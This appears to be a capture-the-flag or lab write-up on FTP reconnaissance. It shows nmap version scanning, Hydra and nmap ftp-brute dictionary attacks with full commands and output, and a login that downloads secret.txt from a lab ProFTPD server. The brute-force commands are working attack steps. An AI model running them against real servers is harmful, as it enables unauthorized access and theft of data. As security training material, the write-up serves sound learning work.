# ProFTP recon basics

## Scan version using nmap

```
nmap -sV 192.145.94.3
Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-28 08:48 UTC
Nmap scan report for target-1 (192.145.94.3)
Host is up (0.000014s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:91:5E:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
```

## Use Hydra to perform dictionary attack on the FTP server

hydra -L [user wordlist] -P [password wordlist] [target] -t 4 ftp

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.145.94.3 -t 4 ftp
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-28 08:50:36
[DATA] max 4 tasks per 1 server, overall 4 tasks, 7063 login tries (l:7/p:1009), ~1766 tries per task
[DATA] attacking ftp://192.145.94.3:21/
[21][ftp] host: 192.145.94.3   login: sysadmin   password: 654321
[21][ftp] host: 192.145.94.3   login: rooty   password: qwerty
[21][ftp] host: 192.145.94.3   login: demo   password: butterfly
[21][ftp] host: 192.145.94.3   login: auditor   password: chocolate
[STATUS] 4038.00 tries/min, 4038 tries in 00:01h, 3025 to do in 00:01h, 4 active
[21][ftp] host: 192.145.94.3   login: anon   password: purple
[21][ftp] host: 192.145.94.3   login: administrator   password: tweety
[STATUS] 3028.00 tries/min, 6056 tries in 00:02h, 1007 to do in 00:01h, 4 active
[21][ftp] host: 192.145.94.3   login: diag   password: tigger
1 of 1 target successfully completed, 7 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-28 08:52:56
```

## Find password of a user using nmap script

```
nmap --script ftp-brute --script-args userdb=/root/users -p 21 192.145.94.3
Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-28 08:54 UTC
Nmap scan report for target-1 (192.145.94.3)
Host is up (0.000045s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: 
|     sysadmin:654321 - Valid credentials
|_  Statistics: Performed 25 guesses in 5 seconds, average tps: 5.0
MAC Address: 02:42:C0:91:5E:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 6.10 seconds
```

## Log in to FTP server and download files

```
ftp 192.145.94.3
Connected to 192.145.94.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.145.94.3]
Name (192.145.94.3:root): sysadmin
331 Password required for sysadmin
Password:
230 User sysadmin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (44.3281 kB/s)
ftp> exit
221 Goodbye.
```

